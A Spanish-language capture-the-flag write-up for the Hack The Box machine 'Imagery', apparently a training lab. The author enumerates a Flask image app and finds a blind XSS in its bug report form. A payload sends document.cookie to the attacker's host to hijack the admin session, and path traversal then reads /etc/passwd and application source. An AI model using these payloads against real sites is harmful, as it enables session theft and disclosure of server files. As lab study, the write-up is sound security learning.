Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.21 seconds
</pre></td></tr></tbody></table></code></div></div>

<p>No hay muchos puertos abiertos, solo existe una web que corre por el puerto 8000</p>

<h2 id="web"><span class="me-2">Web</span><a href="#web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><a href="/assets/img/htb-writeup-imagery/imagery1.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery1.png" alt="" loading="lazy"></a></p>

<p>A simple vista parece una aplicacion web sobre imagenes, ya nos podemos imaginar lo que significa (Arbitrary File Upload) alguna vulnerabilidad sobre subida de archivos…. tambien logramos ver un boton de <code class="language-plaintext highlighter-rouge">login</code> y <code class="language-plaintext highlighter-rouge">register</code></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery2.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery2.png" alt="" loading="lazy"></a></p>

<p>Primero nos vamos a registrar con el usuario <code class="language-plaintext highlighter-rouge">mrincreible@imagery.htb</code> y la contraseña <code class="language-plaintext highlighter-rouge">mrincreible</code></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery3.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery3.png" alt="" loading="lazy"></a></p>

<p>Antes de iniciar sesion quiero mostrarles de que manera pueden ver un poco mas sobre la web con curl</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>curl http://10.10.11.88:8000 <span class="nt">-I</span>
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.7
Date: Fri, 24 Oct 2025 20:26:33 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 146960
Connection: close
</pre></td></tr></tbody></table></code></div></div>

<p>Ya que con wappalayzer a veces no muestra nada, podemos hacerlo con curl pasandole el parametro <code class="language-plaintext highlighter-rouge">-I</code></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery4.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery4.png" alt="" loading="lazy"></a></p>

<h3 id="enumeracion-web-fuzz"><span class="me-2">Enumeracion Web Fuzz</span><a href="#enumeracion-web-fuzz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Pasamos a esta seccion de fuzzear la web para encontrar mas funcionalidades de la app y aprovecharlas</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery5.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery5.png" alt="" loading="lazy"></a></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>/images
/login
/register
/logout
</pre></td></tr></tbody></table></code></div></div>

<p>Solo encontramos esto, pero en la web tenemos un boton <code class="language-plaintext highlighter-rouge">/upload</code>. Es raro, quizas la funcionalidad de este boton este del lado de cliente o en el template como un <code class="language-plaintext highlighter-rouge">JS</code></p>

<p>Tenemos un Token</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery6.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery6.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery7.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery7.png" alt="" loading="lazy"></a></p>

<p>No es valido como un <code class="language-plaintext highlighter-rouge">JWT</code></p>

<h3 id="upload-files"><span class="me-2">Upload Files</span><a href="#upload-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><a href="/assets/img/htb-writeup-imagery/imagery8.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery8.png" alt="" loading="lazy"></a></p>

<p>En esta parte vamos a realizar un testeo a la subida de archivos, subiremos imagenes sin cargas de <code class="language-plaintext highlighter-rouge">XXE,XSS,SSRF o SQLi</code> ya que en este tipo de vulnerabilidades se pueden subir archivos con estas cargas</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery9.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery9.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery10.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery10.png" alt="" loading="lazy"></a></p>

<p>Apreciamos la subida de una imagen con extension <code class="language-plaintext highlighter-rouge">.png</code>, quiero resaltar lo que pusimos en el campo <code class="language-plaintext highlighter-rouge">title</code> y <code class="language-plaintext highlighter-rouge">description</code> a la hora de subir la imagen</p>

<p>Vemos un campo que se refleja en el output de la subida, se ve el campo title y description <code class="language-plaintext highlighter-rouge">test</code>.</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery11.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery11.png" alt="" loading="lazy"></a></p>

<p>Podemos descargar la imagen y tambien borrarla.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>http://10.10.11.88:8000/uploads/77e0649c-520b-4b1c-bacb-40388e85c34e_bmw.jpg
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery12.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery12.png" alt="" loading="lazy"></a></p>

<p>En la anterior imagen observamos un apartado de <code class="language-plaintext highlighter-rouge">group</code> <code class="language-plaintext highlighter-rouge">Add New Group</code> <code class="language-plaintext highlighter-rouge">Save Group</code> pero no podemos modificar este como el usuario <code class="language-plaintext highlighter-rouge">mrincreible</code></p>

<p>Primero estamos entendiendo de que manera funciona la aplicacion web para buscar vias de explotacion. Una de ellas se observa a la hora de reflejar el campo <code class="language-plaintext highlighter-rouge">title</code> y <code class="language-plaintext highlighter-rouge">description</code>, vamos a intentar inyectar una carga XSS en estos campos.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">test</span><span class="s2">"&gt;&lt;script&gt;alert(0)&lt;/script&gt;
</span></pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery13.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery13.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery14.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery14.png" alt="" loading="lazy"></a></p>

<p>Al parecer el codigo harcodea y sanitiza bien las entradas en esos campos.</p>

<p>Observando bien a fondo la web nos encontramos con una seccion llamada <code class="language-plaintext highlighter-rouge">Report Bug</code></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery15.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery15.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery16.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery16.png" alt="" loading="lazy"></a></p>

<p>En estos campos de <code class="language-plaintext highlighter-rouge">Bug Name</code> y <code class="language-plaintext highlighter-rouge">Bug Details</code> voy a poner una carga XSS, siempre pongo en todos los campos para estar seguro del ataque ya que no sabemos cual de los campos es el vulnerable.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">"http://10.10.16.8/poc.jpg"</span><span class="o">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>mientras nos ponemos en escucha con netcat por el puerto 80, ya que la imagen la va a cargar de mi HOST como poc.jpg</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 80
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery17.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery17.png" alt="" loading="lazy"></a></p>

<p>Funciona!!!. Esto ya seria un Blind XSS (XSS a Ciegas), quiero creer que el reporte lo abre algun administrador, vamos a preparar una carga <code class="language-plaintext highlighter-rouge">XSS</code> para secuestrar la sesion del admin.</p>

<h3 id="blind-xss-to-admin-account"><span class="me-2">Blind XSS to Admin Account</span><a href="#blind-xss-to-admin-account" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>&lt;img <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>fetch<span class="o">(</span><span class="s1">'http://10.10.16.8/?c='</span>+document.cookie<span class="o">)</span><span class="p">;</span><span class="o">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery18.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery18.png" alt="" loading="lazy"></a></p>

<p>Como observamos en la imagen tuvimos errores en nc y optamos por ponernos en escucha por el puerto 80 con <code class="language-plaintext highlighter-rouge">python</code> teniendo exito.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aPwk2Q.rf7KI0Y79__1S5ABZshZnMkv3H8
</pre></td></tr></tbody></table></code></div></div>

<p>Tenemos el token de Admin, lo que queda es remplazarlo por la nuestra y secuestrarlo</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery19.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery19.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery20.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery20.png" alt="" loading="lazy"></a></p>

<h3 id="lfi-local-file-inclusion"><span class="me-2">LFI (Local File Inclusion)</span><a href="#lfi-local-file-inclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Este es el Panel de administracion, todos los reportes pasan por aca.</p>

<p>A simple vista logramos visualizar que podemos descargar un <code class="language-plaintext highlighter-rouge">log</code> del usuario admin y otro del usuario <code class="language-plaintext highlighter-rouge">testuser@imagery.htb</code>, para ovservar mejor la descarga de ese archivo lo interceptamos con <code class="language-plaintext highlighter-rouge">Burpsuite</code></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery21.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery21.png" alt="" loading="lazy"></a></p>

<p>Es un archivo que muestra los logs de inicio de sesion del Administrador, supongo que es lo mismo para el usuario <code class="language-plaintext highlighter-rouge">testuser</code>.</p>

<p>Lo primero que se me ocurre testear a la hora de ver archivos que se pueden descargar es:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>../../../../../etc/passwd o ..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

</pre></td></tr></tbody></table></code></div></div>

<p>Los archivos que se descargan de un servidor los toma de alguna carpeta y esto hace que se desencadene un <code class="language-plaintext highlighter-rouge">Path Traversal</code> o <code class="language-plaintext highlighter-rouge">LFI</code>, se puede <code class="language-plaintext highlighter-rouge">URLencodear para Bypassear alguna Restriccion</code></p>

<p><a href="/assets/img/htb-writeup-imagery/imagery22.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery22.png" alt="" loading="lazy"></a></p>

<p>Tenemos un LFI valido, logramos ver el <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User <span class="k">for </span>polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
web:x:1001:1001::/home/web:/bin/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
snapd-range-524288-root:x:524288:524288::/nonexistent:/usr/bin/false
snap_daemon:x:584788:584788::/nonexistent:/usr/bin/false
mark:x:1002:1002::/home/mark:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
dhcpcd:x:110:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery23.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery23.png" alt="" loading="lazy"></a></p>

<p>El archivo <code class="language-plaintext highlighter-rouge">/proc/self/environ</code> nos va a mostrar las variables de entorno que estan colocadas a nivel de sistema, pero no vemos nada relevante.</p>

<p>Es importante ir jugando con el <code class="language-plaintext highlighter-rouge">Path Traversal</code> ir probando de <code class="language-plaintext highlighter-rouge">../</code> a <code class="language-plaintext highlighter-rouge">../../</code> o <code class="language-plaintext highlighter-rouge">../../../</code></p>

<p>Una aplicacion que esta escrita en el lenguaje de <code class="language-plaintext highlighter-rouge">Python</code> va a tener un app.py, config.py, api.py, settings.py, routes.py…. etc, esto solo es una supocicion no digo que todas las apps lo tengan.</p>

<p><a href="/assets/img/htb-writeup-imagery/imagery24.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery24.png" alt="" loading="lazy"></a></p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">from</span> <span class="n">config</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">utils</span> <span class="kn">import</span> <span class="n">_load_data</span><span class="p">,</span> <span class="n">_save_data</span>
<span class="kn">from</span> <span class="n">utils</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">api_auth</span> <span class="kn">import</span> <span class="n">bp_auth</span>
<span class="kn">from</span> <span class="n">api_upload</span> <span class="kn">import</span> <span class="n">bp_upload</span>
<span class="kn">from</span> <span class="n">api_manage</span> <span class="kn">import</span> <span class="n">bp_manage</span>
<span class="kn">from</span> <span class="n">api_edit</span> <span class="kn">import</span> <span class="n">bp_edit</span>
<span class="kn">from</span> <span class="n">api_admin</span> <span class="kn">import</span> <span class="n">bp_admin</span>
<span class="kn">from</span> <span class="n">api_misc</span> <span class="kn">import</span> <span class="n">bp_misc</span>

<span class="n">app_core</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app_core</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">24</span><span class="p">).</span><span class="nf">hex</span><span class="p">()</span>
<span class="n">app_core</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SESSION_COOKIE_HTTPONLY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">False</span>

<span class="n">app_core</span><span class="p">.</span><span class="nf">register_blueprint</span><span class="p">(</span><span class="n">bp_auth</span><span class="p">)</span>
<span class="n">app_core</span><span class="p">.</span><span class="nf">register_blueprint</span><span class="p">(</span><span class="n">bp_upload</span><span class="p">)</span>
<span class="n">app_core</span><span class="p">.</span><span class="nf">register_blueprint</span><span class="p">(</span><span class="n">bp_manage</span><span class="p">)</span>
<span class="n">app_core</span><span class="p">.</span><span class="nf">register_blueprint</span><span class="p">(</span><span class="n">bp_edit</span><span class="p">)</span>
<span class="n">app_core</span><span class="p">.</span><span class="nf">register_blueprint</span><span class="p">(</span><span class="n">bp_admin</span><span class="p">)</span>
<span class="n">app_core</span><span class="p">.</span><span class="nf">register_blueprint</span><span class="p">(</span><span class="n">bp_misc</span><span class="p">)</span>

<span class="nd">@app_core.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">main_dashboard</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">current_database_data</span> <span class="o">=</span> <span class="nf">_load_data</span><span class="p">()</span>
    <span class="n">default_collections</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">My Images</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Unsorted</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Converted</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">Transformed</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">existing_collection_names_in_database</span> <span class="o">=</span> <span class="p">{</span><span class="n">g</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span> <span class="k">for</span> <span class="n">g</span> <span class="ow">in</span> <span class="n">current_database_data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">image_collections</span><span class="sh">'</span><span class="p">,</span> <span class="p">[])}</span>
    <span class="k">for</span> <span class="n">collection_to_add</span> <span class="ow">in</span> <span class="n">default_collections</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">collection_to_add</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">existing_collection_names_in_database</span><span class="p">:</span>
            <span class="n">current_database_data</span><span class="p">.</span><span class="nf">setdefault</span><span class="p">(</span><span class="sh">'</span><span class="s">image_collections</span><span class="sh">'</span><span class="p">,</span> <span class="p">[]).</span><span class="nf">append</span><span class="p">({</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span> <span class="n">collection_to_add</span><span class="p">})</span>
    <span class="nf">_save_data</span><span class="p">(</span><span class="n">current_database_data</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">user_entry</span> <span class="ow">in</span> <span class="n">current_database_data</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">users</span><span class="sh">'</span><span class="p">,</span> <span class="p">[]):</span>
        <span class="n">user_log_file_path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">SYSTEM_LOG_FOLDER</span><span class="p">,</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">user_entry</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">.log</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">user_log_file_path</span><span class="p">):</span>
            <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">user_log_file_path</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[</span><span class="si">{</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="nf">isoformat</span><span class="p">()</span><span class="si">}</span><span class="s">] Log file created for </span><span class="si">{</span><span class="n">user_entry</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="s">.</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">PORT</span><span class="sh">"</span><span class="p">,</span> <span class="mi">8000</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">BLOCKED_APP_PORTS</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Port </span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s"> is blocked for security reasons. Please choose another port.</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">app_core</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/htb-writeup-imagery/imagery25.png" class="popup img-link  shimmer"><img src="/assets/img/htb-writeup-imagery/imagery25.png" alt="" loading="lazy"></a></p>

<p>config.py</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">ipaddress</span>

<span class="n">DATA_STORE_PATH</span> <span class="o">=</span> <span class="sh">'</span><span class="s">db.json</span><span class="sh">'</span>
<span class="n">UPLOAD_FOLDER</span> <span class="o">=</span> <span class="sh">'</span><span class="s">uploads</span><span class="sh">'</span>
<span class="n">SYSTEM_LOG_FOLDER</span> <span class="o">=</span> <span class="sh">'</span><span class="s">system_logs</span><span class="sh">'</span>

<span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">),</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">converted</span><span class="sh">'</span><span class="p">),</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">transformed</span><span class="sh">'</span><span class="p">),</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="nf">makedirs</span><span class="p">(</span><span class="n">SYSTEM_LOG_FOLDER</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="n">MAX_LOGIN_ATTEMPTS</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">ACCOUNT_LOCKOUT_DURATION_MINS</span> <span class="o">=</span> <span class="mi">1</span>

